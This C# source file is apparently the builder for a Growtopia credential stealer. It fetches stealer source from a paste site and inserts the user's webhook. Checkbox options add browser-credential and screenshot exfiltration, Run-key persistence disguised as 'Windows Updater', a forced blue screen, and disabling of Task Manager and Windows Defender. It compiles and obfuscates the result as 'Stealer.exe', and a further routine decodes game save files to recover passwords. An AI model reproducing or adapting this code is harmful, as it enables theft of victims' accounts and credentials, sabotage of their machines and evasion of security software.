using C_Builder.Properties;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace C_Builder
{
    public partial class Form1 : MetroForm
    {
        string IcoFilePath { get; set; }
        List<string> alldata { get; set; }

        string key = "kljsdooqlo4454GG";
        static string temp = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\";

        public Form1()
        {
            InitializeComponent();
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            if (disableManager.Checked || disableDefender.Checked || BSOD.Checked && runAsAdmin.Checked != true)
			{
                runAsAdmin.Checked = true;
            }

            WebClient wc = new WebClient();
            string source = wc.DownloadString("https://paste.tc/raw/IkedYceBP6");
            source = source.Replace("//webhook url", EncryptString(key, webhookUrl.Text));

            if (grabScreenshot.Checked)
            {
                source = source.Replace("//screenshot", @"if (File.Exists(screenshot))
                webHook.AddAttachment(screenshot, Environment.UserName + "" screenshot.png"");");
            }
            if (stealCreds.Checked)
            {
                source = source.Replace("//browsercreds", @"
                if (File.Exists(browsercredpath))
                {
				    webHook.AddAttachment(browsercredpath, Environment.UserName + "" credentials.txt"");
                }");
            }
            if (deleteGrowtopia.Checked)
            {
                source = source.Replace("//deletegt", @"try
				{
                    if (File.Exists(""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia""));
                    {
                        Directory.Delete(""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia"", true);
                    }
                }
                catch
                {
                }");
            }
            if (addStartup.Checked)
            {
                source = source.Replace("//startupxd", @"try
            {
                using (RegistryKey key1 = Registry.LocalMachine.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true))
                {
                    key1.SetValue(""Windows Updater"", ""\\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + ""\\"");
                }
            }
            catch
            {
                using (RegistryKey key1 = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true))
                {
                    key1.SetValue(""Windows Updater"", ""\\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + ""\\"");
                }
            }");
            }

            if (hideStealer.Checked)
            {
                source = source.Replace("//hidestealergobrrr", @"try 
                {
                    File.SetAttributes(Application.ExecutablePath, File.GetAttributes(Application.ExecutablePath) | FileAttributes.Hidden);
                }
                catch
                {
                }");
            }

            if (fakeError.Checked)
            {
                source = source.Replace("//errormessage", "MessageBox.Show(" + '"' + fakeErrorMsg.Text + '"' + "," + "\"Error\"" + ",MessageBoxButtons.OK,    MessageBoxIcon.Error);");
            }

            if (BSOD.Checked)
			{
                source = source.Replace("//BSOD", @"bool flag;
			    Program.RtlAdjustPrivilege(19, true, false, out flag);
			    uint num;
			    Program.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);");
			}

            if (traceSavedat.Checked)
			{
                source = source.Replace("//tracer", "Tracer.TraceSave();");
			}

            if (disableManager.Checked)
			{
                source = source.Replace("//disablemanager", @"try
                {
                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(""Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"");
                    objRegistryKey.SetValue(""DisableTaskMgr"", 1);
                    objRegistryKey.Close();
                }
                catch
                {
                }");
			}

            if (disableDefender.Checked)
			{
                source = source.Replace("//diswin", @"if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

		        RegistryEdit(""SOFTWARE\\Microsoft\\Windows Defender\\Features"", ""TamperProtection"", ""0""); //Windows 10 1903 Redstone 6

                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender"", ""DisableAntiSpyware"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableBehaviorMonitoring"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableOnAccessProtection"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableScanOnRealtimeEnable"", ""1"");

                CheckDefender();");
			}

            if (corruptGt.Checked)
			{
                source = source.Replace("//corruptgt", @"try
                {
                    string gt = ""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia\\"";
                    File.Delete(gt + ""zlibwapi.dll"");
                }
                catch{}");
			}

            if (siteOpenerCheck.Checked)
			{
                source = source.Replace("//siteopener", siteOpener.Text);
			}
			else
			{
                source = source.Replace(@"Process.Start(""//siteopener"");", "");
			}

            if (!String.IsNullOrEmpty(webhookUrl.Text))
			{
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = "Stealer.exe";
                sfd.Filter = "Exe files (Obviously) (*.exe)|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    Compiler(source, sfd.FileName);
                }
            }
			else
			{
                MessageBox.Show("Webhook URL can't be empty :/",
                "Warning",
                MessageBoxButtons.OK,
                MessageBoxIcon.Error);
            }

            void Compiler(string sourceCode, string savePath)
            {
                string[] referencedAssemblies = new string[] { "System.dll", "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll", "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll", "System.Net.Http.dll" };

                Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

                string manifestdec = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
                File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifestdec);
                CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
                CompilerParameters compars = new CompilerParameters();
                compars.ReferencedAssemblies.Add("System.Net.dll");
                compars.ReferencedAssemblies.Add("System.Net.Http.dll");
                compars.ReferencedAssemblies.Add("System.dll");
                compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                compars.ReferencedAssemblies.Add("System.Drawing.dll");
                compars.ReferencedAssemblies.Add("System.Management.dll");
                compars.ReferencedAssemblies.Add("System.IO.dll");
                compars.ReferencedAssemblies.Add("System.IO.compression.dll");
                compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
                compars.ReferencedAssemblies.Add("System.Core.dll");
                compars.ReferencedAssemblies.Add("System.Security.dll");
                compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
                string ospath = Path.GetPathRoot(Environment.SystemDirectory);
                string tempPath = ospath + "Temp";
                compars.GenerateExecutable = true;
                compars.OutputAssembly = savePath;
                compars.GenerateInMemory = false;
                compars.TreatWarningsAsErrors = false;
                compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";

                if (!string.IsNullOrEmpty(metroTextBox1.Text) || !string.IsNullOrWhiteSpace(metroTextBox1.Text) && metroTextBox1.Text.Contains(@"\") && metroTextBox1.Text.Contains(@":") && metroTextBox1.Text.Length >= 7)
                {
                    compars.CompilerOptions += " /win32icon:" + @"""" + metroTextBox1.Text + @"""";
                }
                else if (string.IsNullOrEmpty(metroTextBox1.Text) || string.IsNullOrWhiteSpace(metroTextBox1.Text))
                {

                }

                if (runAsAdmin.Checked)
                {
                    compars.CompilerOptions += " /win32manifest:" + @"""" + Application.StartupPath + @"\manifest.manifest" + @"""";
                }

                CompilerResults compilerResults = provider.CompileAssemblyFromSource(compars, sourceCode); // source.cs
                try
                {
                    Confuser.Obfuscate(savePath);
                }
                catch (Exception ex)
                {
                    File.Delete(savePath);
                    MessageBox.Show(ex.ToString());
                }
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                        File.Delete(Application.StartupPath + @"\manifest.manifest");
                    }

                }
                else
                {
                    File.Delete(Application.StartupPath + @"\manifest.manifest");
                    MessageBox.Show("Compile Succesful!");
                }
                return;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCVdIkguy3Iv2UJ_Go5rrPJw/");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Decoder.SelectTab(metroTabPage1);
        }

        public static string EncryptString(string key, string plainText)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }

        public static string DecryptString(string key, string cipherText)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

		private void groupBox2_Enter(object sender, EventArgs e)
		{

		}


		private void metroLabel2_Click(object sender, EventArgs e)
		{

		}

		private void label7_Click(object sender, EventArgs e)
		{

		}
		private void metroTextBox3_Click(object sender, EventArgs e)
		{

		}

		private void fakeErrorMsg_Click(object sender, EventArgs e)
		{

		}

		private void fakeError_CheckedChanged(object sender, EventArgs e)
		{
            if (fakeError.Checked)
            {
                fakeErrorMsg.Enabled = true;
            }
            else
            {
                fakeErrorMsg.Enabled = false;
            }
        }

		private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
            if (metroCheckBox1.Checked != true)
			{
                metroCheckBox1.Checked = true;
			}
		}

		private void BSOD_CheckedChanged(object sender, EventArgs e)
		{
            if (BSOD.Checked)
			{
                runAsAdmin.Checked = true;
			}
		}

		private void traceSavedat_CheckedChanged(object sender, EventArgs e)
		{

		}

		private void disableManager_CheckedChanged(object sender, EventArgs e)
		{
            if (disableManager.Checked)
            {
                runAsAdmin.Checked = true;
            }
        }

		private void disableDefender_CheckedChanged(object sender, EventArgs e)
		{
            if (disableDefender.Checked)
            {
                runAsAdmin.Checked = true;
            }
        }

		private void siteOpenerCheck_CheckedChanged(object sender, EventArgs e)
		{
            if (siteOpenerCheck.Checked)
            {
                siteOpener.Enabled = true;
            }
            else
            {
                siteOpener.Enabled = false;
            }
        }

		private void Form1_DragDrop(object sender, DragEventArgs e)
		{

		}

		private void Form1_DragEnter(object sender, DragEventArgs e)
		{

		}

		private void metroButton2_Click(object sender, EventArgs e)
		{

		}

		private void listBox4_SelectedIndexChanged(object sender, EventArgs e)
		{

		}

		private void metroButton1_Click(object sender, EventArgs e)
		{

		}
        public class PasswordDec
        {
            public List<string> PPW(byte[] contents)
            {
                List<string> result;
                try
                {
                    string text = "";
                    for (int i = 0; i < contents.Length; i += 1)
                    {
                        byte b = contents[i];
                        string text2 = b.ToString("X2");
                        bool flag = text2 == "00";
                        if (flag)
                        {
                            text += "<>";
                        }
                        else
                        {
                            text += text2;
                        }
                    }
                    bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                    if (flag2)
                    {
                        string text3 = "74616E6B69645F70617373776F7264";
                        int num = text.IndexOf(text3);
                        int num2 = text.LastIndexOf(text3);
                        bool flag3 = false;
                        string text4;
                        if (flag3)
                        {
                            text4 = string.Empty;
                        }
                        num += text3.Length;
                        int num3 = text.IndexOf("<><><>", num);
                        bool flag4 = false;
                        if (flag4)
                        {
                            text4 = string.Empty;
                        }

                        string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
                        bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
                        if (flag5)
                        {
                            text4 = text.Substring(num, num3 - num).Trim();
                        }
                        else
                        {
                            num2 += text3.Length;
                            num3 = text.IndexOf("<><><>", num2);
                            text4 = text.Substring(num2, num3 - num2).Trim();
                        }
                        string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                        int num4 = text.IndexOf(text5);
                        bool flag6 = false;
                        string text6;
                        if (flag6)
                        {
                            text6 = string.Empty;
                        }
                        num4 += text5.Length;
                        int num5 = text.IndexOf("<><><>", num4);
                        bool flag7 = false;
                        if (flag7)
                        {
                            text6 = string.Empty;
                        }

                        text6 = text.Substring(num4, num5 - num4).Trim();
                        int num6 = StringToByteArray(text4)[0];
                        text6 = text6.Substring(0, num6 * 2);
                        byte[] array = StringToByteArray(text6.Replace("<>", "00"));
                        List<byte> list = new List<byte>();
                        List<byte> list2 = new List<byte>();
                        byte b2 = (byte)(48 - array[0]);
                        byte[] array2 = array;
                        for (int j = 0; j < array2.Length; j += 1)
                        {
                            byte b3 = array2[j];
                            list.Add((byte)(b2 + b3));
                        }
                        for (int k = 0; k < list.Count; k += 1)
                        {
                            list2.Add((byte)(list[k] - 1 - k));
                        }
                        List<string> list3 = new List<string>();
                        int num7 = 0;
                        while ((num7 > 255 ? 1 : 0) == 0)
                        {
                            string text7 = "";
                            foreach (byte b4 in list2)
                            {
                                bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
                                if (flag8)
                                {
                                    text7 += ((char)((byte)((int)b4 + num7))).ToString();
                                }
                            }
                            bool flag9 = text7.Length == num6;
                            if (flag9)
                            {
                                list3.Add(text7);
                            }
                            num7 += 1;
                        }
                        result = list3;
                    }
                    else
                    {
                        result = null;
                    }
                }
                catch
                {
                    result = null;
                }
                return result;
            }
            public byte[] StringToByteArray(string str)
            {
                Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
                for (int i = 0; i <= 255; i++)
                    hexindex.Add(i.ToString("X2"), (byte)i);

                List<byte> hexres = new List<byte>();
                for (int i = 0; i < str.Length; i += 2)
                    hexres.Add(hexindex[str.Substring(i, 2)]);

                return hexres.ToArray();
            }
            private bool ValidateChar(char cdzdshr)
            {
                if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                        (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                        (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                        (cdzdshr >= 0x2B && cdzdshr <= 0x2E)) return true;
                else return false;
            }

            public string[] Func(byte[] lel)
            {
                byte[] buff = lel;
                var passwords = PPW(buff);
                return passwords.ToArray();
            }
        }

        private void selectFolder_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderDlg = new FolderBrowserDialog();
            folderDlg.ShowNewFolderButton = true;
            DialogResult result = folderDlg.ShowDialog();
            if (result == DialogResult.OK)
            {
                string savefolderpath = folderDlg.SelectedPath;
                savedatFolderPath.Clear();
                savedatFolderPath.AppendText(savefolderpath);
                Program.setSetting("savefolderpath", savedatFolderPath.Text);
            }
        }
        public List<string> DecodeDats()
        {
            try
            {
                List<string> alldata = new List<string>();
                saveDatList.Items.Clear();
                string savefolderpath = ConfigurationManager.AppSettings["savefolderpath"];
                string[] allsaves = Directory.GetFiles(savefolderpath, "*.dat");
                var pattern = new Regex(@"[^\w0-9]");
                foreach (string i in allsaves)
                {
                    string savedata = null;
                    var r = File.Open(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (FileStream fileStream = new FileStream(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                        {
                            savedata = streamReader.ReadToEnd();
                        }
                    }
                    string cleardata = savedata.Replace("\u0000", " ");
                    string GrowID = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                    saveDatList.Items.Add(GrowID);
                    string LastWorld = pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
                    if (LastWorld == "fullscreen")
                    {
                        LastWorld = null;
                    }
                    string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
                    string allpw = "";
                    foreach (string pw in passwords)
                    {
                        allpw += pw + "[#---Zephyr---#]";
                    }
                    string accdata = GrowID + "[This-Is-A-Split]" + LastWorld + "[This-Is-A-Split]" + allpw;
                    alldata.Add(accdata);
                }
                return alldata;
            }
            catch
            {
                return null;
            }
        }

        private void refreshDats_Click(object sender, EventArgs e)
        {
            alldata = DecodeDats();
        }

        private void saveDatList_SelectedIndexChanged(object sender, EventArgs e)
        {
            passwords.Clear();
            lastWorld.Clear();
            growid.Clear();
            try
            {
                string curGrowID = saveDatList.SelectedItem.ToString();
                growid.Text = curGrowID;
                string rawresult = alldata.FirstOrDefault(alldata => alldata.Contains(curGrowID));
                string[] result = rawresult.Split(new[] { "[This-Is-A-Split]" }, StringSplitOptions.RemoveEmptyEntries);
                lastWorld.Text = result[1];
                string rawpasswords = result[2];
                string[] passwords = rawpasswords.Split(new[] { "[#---FacelesS---#]" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string i in passwords)
                {
                    if (i != "")
                    {
                        this.passwords.AppendText(i);
                        this.passwords.AppendText(Environment.NewLine);
                    }
                }
            }
            catch
            {
            }
        }

		private void iconChanger_Click(object sender, EventArgs e)
		{
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                OpenFileDialog dialog = new OpenFileDialog();
                dialog.Filter = "Ico files (*ico)|*.ico";
                dialog.Title = "Select an ico file";
                DialogResult result = dialog.ShowDialog();
                if (result == DialogResult.OK)
                {
                    pictureBox1.Load(dialog.FileName);
                    pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                    IcoFilePath = dialog.FileName;
                    metroTextBox1.Clear();
                    metroTextBox1.Text = IcoFilePath;
                }
            }
        }
        void Pumpexe(decimal size, string path)
        {


            FileStream file = File.OpenWrite(path);

            long ende = file.Seek(0, SeekOrigin.End);

            decimal groesse = size * 1048576;

            while (ende < groesse)
            {
                ende++;

                file.WriteByte(0);
            }

            file.Close();
        }
        private void metroButton1_Click_1(object sender, EventArgs e)
        {
            OpenFileDialog open = new OpenFileDialog();
            open.Filter = "*.exe | *.exe";
            if (open.ShowDialog() == DialogResult.OK)
            {

                Pumpexe(int.Parse(metroTextBox2.Text), open.FileName);


            }
            MessageBox.Show("Pumped lol.");

            
        }
    }
}
